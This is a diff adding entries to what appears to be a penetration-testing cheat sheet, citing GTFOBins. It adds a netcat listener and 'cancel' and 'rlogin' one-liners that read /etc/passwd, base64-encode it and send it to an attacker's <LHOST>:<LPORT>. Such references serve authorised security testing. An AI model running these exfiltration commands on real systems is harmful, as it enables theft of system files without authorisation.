@@ -595,6 +595,21 @@ $ file <file>
 
 ## File Transfer
 
+> https://gtfobins.github.io/#+file%20upload
+
+### cancel
+
+```c
+$ nc -nlvp 18110
+$ cancel -u "$(cat /etc/passwd | base64)" -h <LHOST>:<LPORT>
+```
+
+### rlogin
+
+```c
+$ rlogin -l "$(cat /etc/passwd | base64)" -p <LPORT> <LHOST>
+```
+
 ### SMB Access via PowerShell
 
 ```c
